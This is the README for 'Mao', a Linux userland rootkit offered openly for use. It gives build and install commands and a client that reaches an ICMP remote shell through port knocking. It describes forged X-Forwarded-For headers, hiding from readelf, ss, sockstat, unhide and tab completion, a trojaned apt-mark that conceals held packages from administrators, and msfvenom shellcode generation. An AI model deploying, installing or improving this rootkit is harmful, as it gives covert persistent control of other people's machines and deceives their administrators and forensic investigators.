# Mao
A protracted people's rootkit.<br><br>
<img src="https://i.redd.it/4pwkibrp0uq91.jpg" />

Another x86_64 userland rootkit for Linux. 
---

Like in real life, Mao took a lot of inspiration from <a href="https://github.com/mephistolist/hoxha">Hoxha</a>. While his style differed from <a href="https://github.com/mephistolist/tito">Tito</a>, they both integrated elements of Capitalism into their economies. At the same time, Mao had his own theory and legacy. For this reason you may find elements of the two previously mentioned projects, but a great deal of improvements and changes. Better mutation, anti-forensics and better hiding on the system. Again, I will probably hold off on going in-depth on this project until after its publication. 

You will need to install one dependency in order to build this code:

```
sudo apt install libreadline-dev
```

You can then download make and install with the following:

```
git clone https://github.com/mephistolist/Mao.git; cd Mao; make; make install;

```

After this you should have a binary called 'enver', you cannot see in the project directory. However, you can type 'enver' with the ip address of where you have this installed to connect:

```
./enver 127.0.0.1
[*] Initiating knock sequence. Please wait.
[*] ☭ Political power grows out of the barrel of a gun. ☭
[+] ICMP shell connected. Type commands (type 'exit' to quit):
icmp-shell>
```

New Features
---

The enver client taken from <a href="https://github.com/mephistolist/hoxha">Hoxha</a> has the ability to spoof X-Forwarded-For, X-Originating-IP, X-Remote-IP and X-Remote-Addr headers. In the event someone was to intercept your traffic and you have spoofed your ip via a vpn or proxy, these headers give away your true location, or confuse someone further if also spoofed. 

You will also notice that both enver and hoxha have checks to ensure that the hex value of 0xDEADBEEF is passed. So even after the port-knocking checks and passwords, that will be need to be passed with each packet to ensure the connections stays in place.

Unlike with <a href="https://github.com/mephistolist/hoxha">Hoxha</a>, we will be hidden from readelf, unhide, sockstat, ss and tab completion. Though you may need to exit SSH and reconnect after installing to see the hidding from tab completion worker.

To prevent overwriting of packages that would fool an administrator, we will also install a custom version of apt-mark that will not show packages we have put on hold. 

Like <a href="https://github.com/mephistolist/tito">Tito</a>, we will use an ICMP shell, but the shell with Tito used older functions that could not allow for static linking. The ICMP shell with Mao will allow for static linking.

A lot of new features were added to the sections for mutation and antibugging, 

Devlopment Notes
---

If you make changes to this code, you will need to regenerate its binary data with msfvenom:

```
msfvenom -p linux/x64/exec CMD=/usr/bin/hoxha -f raw -o shellcode.bin -b "\x00\x0a\x0d"
```

Then convert that to base64:

```
cat shellcode.bin | base64 -w0
```

Then replace it with the base64 inside libexec.c and recompile to apply your changes. 

If you want to make changes to the binaries in the 'tools' directory, you can grep for 'Mao' in the source code to see where we have made our edits:

```
# grep -nr Mao references/
references/sockstat.c:299:    /* --- Mao Handler --- */
references/readelf.c:1977:	/* Mao handler */  
references/ss.c:2469:    	/* Mao handler to hide ICMP/ICMPv6 sockets entirely */
references/apt-mark.cc:368:    // Mao - packages to filter out
```

The README file in the 'references' directory will have further documentation.

This has currently been tested on Debian Forky using kernel 6.16.7.
